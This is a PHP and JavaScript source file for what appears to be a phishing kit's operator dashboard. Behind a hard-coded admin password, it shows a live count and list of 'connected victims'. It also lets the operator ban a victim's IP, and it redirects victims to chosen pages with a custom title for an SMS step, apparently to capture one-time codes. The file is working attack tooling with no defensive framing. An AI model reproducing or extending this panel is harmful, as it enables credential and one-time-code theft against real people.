<?php

$correct_username = 'Admin';
$correct_password = '8188';


if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== $correct_username || $_SERVER['PHP_AUTH_PW'] !== $correct_password) {
    

    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Unauthorized access! Please provide valid login credentials.';
    exit;
}


require "classes/Jeehan.class.php";
?>

<html>
<head>
<title>Live Panel</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="res/style.css">
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
Live Control Panel
</div>
<div class="list-section">
<h3>Connected Victims: <b id="victims-counter">0</b></h3>

<div class="list" id="v-list">

</div>

</div>
<div id="customModal" class="modal" style="display:none;">
    <div class="modal-content">
        <span class="close" onclick="closeCustomDialog()">&times;</span>
        <h2>Enter Custom Title for SMS</h2>
        <input type="text" id="customTitle" placeholder="Enter title here..." style="width: 100%; padding: 10px;">
        <button id="submitCustomTitle" style="margin-top: 10px;">Submit</button>
    </div>
</div>
<script>
function ban(ip){
	var conf = confirm("you sure want to block this victim? :o");
	if(conf){
	$.post("process/processor.php",{ban:ip}, function(done){
		alert(done);
	} );
	}
}

function closeCustomDialog() {
    document.getElementById('customModal').style.display = 'none';
}


document.getElementById('submitCustomTitle').addEventListener('click', function() {
	console.log("ok")
    const title = document.getElementById('customTitle').value;
    const vicId = window.currentVicId;
	const code = window.currentCode 

    if (!title.trim()) {
        alert('Please enter a title.');
        return;
    }


	redirectVic(code,vicId,title)


   
});


function openCustomModal(code,vicId) {
    document.getElementById('customModal').style.display = 'block';
    window.currentVicId = vicId; 
	window.currentCode = code ;
}



function redirectVic(page, id,title){
	$.post("process/processor.php", 
	{pageID:page, vicID:id,title:title} );
}

setInterval(function(){
	$.post("process/processor.php", 
	{getOnlineVics:1}, function(data){
		$("#victims-counter").html(data);
	} );
}, 2000);

setInterval(function(){
	$.post("process/processor.php", 
	{getVictims:1}, 
	function(done){	
		$("#v-list").html(done);
	});
}, 2000);
</script>
</body>
</html>